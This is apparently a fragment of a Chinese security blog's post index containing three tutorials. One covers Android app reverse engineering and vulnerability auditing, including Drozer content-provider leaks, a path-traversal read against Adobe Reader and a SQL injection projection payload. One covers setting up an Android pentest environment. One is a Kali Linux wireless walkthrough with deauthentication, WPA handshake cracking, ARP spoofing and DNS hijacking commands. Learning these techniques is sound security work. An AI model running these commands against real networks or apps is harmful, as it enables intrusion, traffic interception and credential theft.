-    <content type="text"><![CDATA[Android应用程序文件结构apk程序文件结构一般.apk程序包括以下文件和文件夹： Classes.dex （文件） AndroidManifest.xml （文件） META-INF （文件夹） resources.arsc （文件） res （文件夹） assets （文件夹） lib （文件夹） Android 应用程序组件Android 应用程序由各种组件组成，它们一起创建可工作的应用程序。 这些组件是活动，服务，广播接收器，内容供应器和共享首选项。 活动（Activity）：用户可以与之交互的可视界面。包括按钮，图像，TextView或任何其他可视组件。 服务（Service）：这些 Android 组件在后台运行，并执行开发人员指定的特定任务。这些任务包括从 HTTP 下载文件到在后台播放音乐等任何内容。 广播接收器（Broadcast Receiver）： Android 应用程序中的接收器，通过 Android 系统或设备中存在的其他应用程序，监听传入的广播消息。一旦它们接收到广播消息，就可以根据预定义的条件触发特定动作。条件可以为收到 SMS，来电呼叫，电量改变等等。 共享首选项（Shared Preference）：应用程序使用这些首选项，以便为应用程序保存小型数据集。此数据存储在名为shared_prefs的文件夹中。这些小数据集可以包括名值对，例如游戏中的用户得分和登录凭证。不建议在共享首选项中存储敏感信息，因为它们可能易受数据窃取和泄漏的影响。 意图（Intent）：这些组件用于将两个或多个不同的 Android 组件绑定在一起。意图可以用于执行各种任务，例如启动动作，切换活动和启动服务。 内容供应器（Content Provider）：这些组件用于访问应用程序使用的结构化数据集。应用程序可以使用内容供应器访问和查询自己的数据或存储在手机中的数据。 Android应用程序逆向Dex2jar逆向Android应用程序dex2jar将字节码（如Classes.dex）转换为可读文件的工具，将.dex文件转换为.jar文件。.dex文件是由java字节码转换的Dalvik字节码。从cmd转到dex2jar文件夹，运行以下命令使用dex2jar工具。12$ d2j-dex2jar.bat "X:\..\abc.apk" dex2jar X:\..\abc.apk -&gt; abc-dex2jar.jar dex2jar将.apk的.dex文件转换为.jar文件后，就可以使用Java图形查看器（如JD-GUI）打开.jar文件。微信7.0.3 for Android的java源代码。 注意：如果应用程序开发人员使用一些防止反编译的保护，如 proguard 和 dex2jar，我们使用 dex2jar 或 Apktool 反编译应用程序时，不会看到准确的源代码，而是一堆不同的源文件，并不是原始源代码。 ApkTool逆向Android应用程序另一种Android逆向的方法是将.dex文件转换为smali文件，smali是一种文件格式，其语法跟Jasmine语言类似。ApkTool的优点是操作是双向的，反编译一个程序后可以使用ApkTool重新编译，且编译生成一个新的.apk文件。 ApkTool反编译apk程序 1$ apktool d [app_name].apk -d：表示反编译。如果想重新编译一个应用程序，使用-b（build）参数。 1$ apktool b [folder name] [app_name].apk 网上有另外一款Virtuous Ten Studio（VTS）工具，其功能与ApkTool类似，只是提供了UI界面方便操作，但只能在windows下运行。下载地址： 1http://www.virtuous-ten-studio.com/ Android应用安全漏洞审计由于开发人员未严格遵守安全编码规范，或开发过程中的错误代码，导致Android应用程序出现各种类型的安全漏洞，下面将学习Android漏洞的挖掘和利用。 内容供应器泄漏许多应用程序使用内容供应器来存储和查询应用程序中的数据或来自电话的数据。 除非已经定义了内容提供者可以使用权限来访问，否则任何其他应用都可以使用应用所定义的内容供应器来访问应用的数据。 所有内容供应器具有唯一的统一资源标识符（URI）以便被识别和查询。 内容提供者的 URI 的命名标准惯例是以content://开始。如果 Android API 版本低于 17，则内容供应器的默认属性是始终导出。 这意味着除非开发人员指定权限，否则任何应用程序都可以使用应用程序的内容供应器来访问和查询数据。 所有内容供应器都需要在AndroidManifest.xml中注册。 因此，我们可以对应用程序使用 Apktool，并通过查看AndroidManifest.xml文件检查内容供应器。定义内容供应器的一般方法如下所示： 1234&lt;provider android:name="com.test.example.DataProvider" android:authorities ="com.test.example.DataProvider"&gt;&lt;/provider&gt; 下面查看一个内容供应器泄漏漏洞的例子，并尝试利用该漏洞。1.使用ApkTool对应用程序反编译。2.查看定义内容供应器的AndroidManifest.xml文件，也可以使用grep命令从代码中获取内容供应器.1$ grep -R 'content://' 3.为查询内容供应器并确认漏洞是可利用的，需要在Android设备或模拟器中安装该应用程序，使用以下命令在模拟器中安装该.apk文件。123$ adb install [app_name].apkPerfirming Streamed InstallSuccess 然后可以创建一个没有任何权限的应用程序来查询存在漏洞的应用程序的内容供应器，可以使用adb查询内容供应器： 1$ adb shell content query --uri [URI of the content provider] Drozer是一款针对Android系统的安全测试框架，通过分析AndroidManifest.xml看四大组件中有无可export的，如果有就详细查看可export的组件是否真存在漏洞。下载地址：1https://labs.mwrinfosecurity.com/tools/drozer/ 安装后需要将代理组件agent.apk安装到模拟器，还需要在启动模拟器时转发一个特定端口31415建立连接。可以使用以下命令完成操作： 123$ adb install agent.apk$ adb forward tcp:31415 tcp:31415 启动drozer agent代理程序，单击”Embedded Server”&gt;”Disabled”启动服务器。 在cmd启动Drozer终端连接到模拟器：1$ drozer console connect 成功进入Drozer Console后，运行app.provider.finduri模块查找所有内容供应器。1dz&gt; run app.provider.finduri [URI of the content provider] 使用app.provider.query模块查询内容供应器URI，如果能够查询到来自内容供应器的数据，意味着内容供应器泄漏数据且存在漏洞，因为Drozer未被明确授予使用数据集的任何权限。 漏洞修复建议：在创建内容供应器时指定参数android:exported = false，或创建一些新的权限，其他程序在访问供应器之前必须请求它。 不安全的文件存储开发人员对应用程序存储数据时未指定文件的正确操作权限，这些文件有时会被标记成全局可读，其他程序访问不需要请求权限，导致文件不安全存储问题。按照以下步骤对该漏洞进行检测：1.通过adb shell使用cd命令进入/data/data/[app_name]。2.使用find命令搜索特定权限的文件。1# find /data/data/ -perm [permossions value] 使用cat和grep等命令可查看文件存储的信息，如：密码，等。 漏洞修复建议：开发人员设置正确的文件操作权限，对密码等敏感数据使用加密等手段处理。 目录遍历或本地文件包含漏洞应用程序中的目录遍历漏洞允许攻击者使用漏洞读取其他系统文件，该漏洞可使用Drozer进行检测。 通过分析Adobe Reader 10.3.1版本中存在的目录遍历漏洞，可以清晰地理解该漏洞利用方法。1.使用adb install adobe_reader_x_10.3.1_64606.apk安装.apk程序。2.启动Drozer，使用app.provider.finduri模块查找内容供应器URI。1234dz&gt; run app.provider.finduri com.adobe.readerScanning com.adobe.reader...content://com.adobe.reader.fileprovider/content://com.adobe.reader.fileprovider 3.使用app.provider.read利用查找到的URI，如尝试读取/proc/cpuinfo文件内容，该文件默认存在所有Android实例中。1dz&gt; run app.provider.read content://com.adobe.reader.fileprovider/../../../../proc/cpuinfo SQL注入SQL注入与WEB端类似，都是因为开发人员未对用户输入和服务器端输出进行严格检查，Android使用的是SQLite数据库。对SQL注入漏洞的利用，除与WEB端SQL注入漏洞类型利用方法外，还可以使用Drozer的app.provider.query模块利用SQL注入漏洞。 1dz&gt; run app.provider.query [Content Provider URI] --projection "* FROM SQLITE_MASTER WHERE type='table';- -" 上述命令将返回SQLite数据库中全部表的列表，SQLITE_MASTER中保存数据库的基本信息。 OWASP Mobile TOP 10 脆弱的服务器端安全控制 OWASP排名第一的漏洞“脆弱的服务器端安全控制”，就是没有以一个安全的方式从移动应用程序向服务器端发送数据，或在发送数据时暴露了某些敏感API。如：考虑对一个Android应用程序登录服务器的凭据进行身份验证，未对用户输入进行验证，可能被攻击者利用修改凭证来获得服务器敏感或未授权的区域。这是移动端和WEB端都存在的漏洞类型。 不安全的数据存储 即在设备上存储任意用户都能够访问的与应用程序相关的信息。许多Android应用在shared preferences、SQLite（明文形式）或外部存储器存储用户敏感信息或应用程序信息。 传输层保护不足 许多Android开发者使用了不安全方式进行数据传输，如HTTP协议，或未正确实现SSL，这使得程序容易受到各种类型攻击，如从应用向服务器发送数据时进行数据包拦截，参数操作，修改响应数据，以便获得应用锁定区域的访问权限。 意外的数据泄露 此漏洞是由于应用程序本身存储数据位置是脆弱的，如：剪切板、URL缓存、浏览器cookies、HTML5数据存储，等。 弱授权和身份认证 一个Android应用程序，如果试图在没有适当安全措施的情况下通过客户端检测进行用户验证或授权，那么就是存在风险的。应当指出的是，手机root后大多数客户端保护都是可以绕过的，因此建议开发人员使用适当的检测方法在服务器端进行身份验证和授权，并在移动端使用一个随机生成的令牌验证用户。 密码破解 使用不安全的加密函数加密数据组件，包括某些已知不安全加密算法，如MD5、SHA1、RC2等。 客户端注入 run app.provider.query [Content Provider URI] –projection “* FROM SQLITE_MASTER WHERE type=’table’;- -“ 通过不可信输入进行安全决策 在移动应用程序中，开发人员应该清洗和检查用户输入或其他相关输入，不可信输入可能导致应用中其他安全风险，如客户端注入。 Session会话处理不当 在对一个应用程序的session进行处理时，开发人员需要关注很多因素，如合适的过期身份验证cookie，安全令牌创建，cookie生成和旋转，后台无效session等。在web应用和Android应用程序之间必须保存一个适当的安全同步。 缺乏二进制文件保护 不能有效阻止应用程序被逆向或反编译。apktool、dex2jar等工具对Android进行逆向，从而导致各种安全风险，为防止应用被逆向，开发人员可以使用proguardand和dasho等对应用进行加固。]]></content>
-      <categories>
-        <category>Android安全</category>
-      </categories>
-      <tags>
-        <tag>Android安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Android安全基础及环境配置]]></title>
-    <url>%2F2019%2F04%2F06%2FAndroid%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%2F</url>
-    <content type="text"><![CDATA[Android安全基础Dalvik虚拟机（DVM）；Android4.4版本之后，Android运行时（ART）。Android安全模型的核心是Linux特权分离。与Linux类似，用作命令的二进制文件位于/system/bin和/system/xbin；安装的应用程序位于/data/data；原始安装文件（.apk）存储在/data/app；从Play商店购买的应用程序存储在/data/app-private/。 Android虚拟环境配置Android Studio下载地址1https://developer.android.com/studio 汉化文件下载将汉化文件复制到X:\Android\Android Studio\lib\，重启生效。 Genymotion下载地址1https://www.genymotion.com/download/ 下载需要登录，分为包含virtualbox和不包含virtualbox两个版本。 Android Studio关联GenymotionAndroid Studio的File&gt;Setting&gt;Plugins&gt;Browse repositories，搜索Genymotion并安装，重启后生效。在工具栏出现Genymotion图标（如果找不到，打开视图勾选工具栏），点击提示关联Genymotion路径。 渗透测试实用工具Android Debug BridgeAndroid Debug Bridge 是一个客户端 - 服务器程序，允许用户与模拟器器或连接的 Android 设备交互。 它包括客户端（在系统上运行），处理通信的服务器（也在系统上运行）以及作为后台进程在模拟器和设备上上运行的守护程序。 客户端用于 ADB 通信的默认端口始终是 5037，设备使用从 5555 到 5585 的端口。使用cmd运行adb devices命令与已启动的模拟器交互。 使用pm包管理器获取已安装的软件包列表 1$ adb shell pm list packages 使用dumpsys meminfo获取全部应用程序及当前内存占用列表 1$ adb shell dumpsys meminfo 使用logcat（读取Android设备事件日志的工具），并保存到指定文件 1$ adb logcat -d -f /data/local/logcats.log Android SDK中的MonkeyRunner工具用于自动化和测试Android应用程序，甚至与应用程序交互。如，为了使用10个自动化触摸，敲击和事件来测试应用程序，可以在adb shell中使用monkey 10命令 1$ monkey 10 Burp SuiteBurp Suite配置好之后，使用以下命令使用代理。 1$ emulator -avd [name of the avd] -http-proxy 127.0.0.1:8080 ApkToolApkTool下载 将下载的文件解压保存在任一目录，并配置path环境变量，就可以在cmd中使用apktool命令。 Dex2jar下载地址1https://code.google.com/p/dex2jar/ Dex2jar下载 JD-GUI下载地址1http://jd.benow.ca/ JD-GUI下载]]></content>
-      <categories>
-        <category>Android安全</category>
-      </categories>
-      <tags>
-        <tag>Android安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Kali Linux无线渗透初探]]></title>
-    <url>%2F2019%2F04%2F06%2FKali%20Linux%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2%2F</url>
-    <content type="text"><![CDATA[新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。 前期渗透启用无线网卡1$ ifconfig wlan0 up 开启网卡监听模式1$ airmon-ng start wlan0 输入ifconfig命令查看网卡名称变为wlan0mon；输入iwconfig命令确认mode为monitor模式。 扫描附近wifi热点1$ airodump-ng wlan0mon BSSID是路由器MAC地址，CH是无线信道。 对目标路由器进行抓包1$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w cap wlan0mon -c：信道–bssid：路由器MAC地址-w：指定抓到的包存放文件 此时可查看路由器接入的设备MAC地址，但是无法抓取设备发送到路由器的密码认证数据包，需要将目标设备踢下线自动重连，抓取认证握手包。 将目标设备踢下线1$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon -0：发送n条认证消息-a：路由器MAC地址-c：目标设备MAC地址 看到[WPA handshark:]代表成功抓取认证握手数据包。保存的文件目录中有cap-01.cap文件，通过爆破方式可解密认证密码。 密码爆破1$ aircrack-ng cap-01.cap -w password.txt 内网漫游接下来要对目标设备进行进一步攻击，如ARP欺骗、DNS劫持，等。 关闭网卡监听模式1$ airmon-ng stop wlan0mon 用爆破得到的密码连入目标无线网络，查看获取的IP地址，可推断出网关地址。 用nmap扫描内网就可获取已接入的主机信息。 nmap扫描主机1$ nmap -sP 192.168.1.1/24 选择一台目标靶机，并开启流量转发功能，使靶机流量先经过kali再到路由器。 流量转发1$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward 然后cat /proc/sys/net/ipv4/ip_forward，如果返回1代表流量转发成功。 对靶机进行ARP欺骗1$ arpspoof -i wlan0 -t 192.168.1.3 -r 192.168.1.1 -i：网卡名称-t：目标靶机IP地址-r：网关IP地址 此时已成功完成中间人攻击，可获取靶机到路由器的全部流量信息，可使用其他工具分析流量信息。 使用driftnet监听浏览的图片1$ driftnet -i wlan0 使用wireshark分析包内容，或抓取账号密码1$ wireshark &amp; DNS劫持首先添加一条解析 1$ vi /etc/ettercap/etter.dns 例：www.google.com A 1.1.1.1 然后打开ettercap，[sniff]&gt;[Unified sniffing]，选择wlan0网卡，[Plugins]&gt;[Manage the plugins]，双击dns_spoof模块，最后[start]&gt;[start sniffing]。此时靶机打开google会解析到1.1.1.1，成功完成DNS劫持。 以上攻击时建立在http协议上，对于https协议，可使用sslstrip对https进行降级，但会导致浏览器提示证书报错，对https协议攻击会另写一篇进行说明。]]></content>
-      <categories>
-        <category>无线网络渗透</category>
-      </categories>
-      <tags>
-        <tag>无线渗透测试</tag>
+        <tag>安全开发</tag>
       </tags>
   </entry>
 </search>
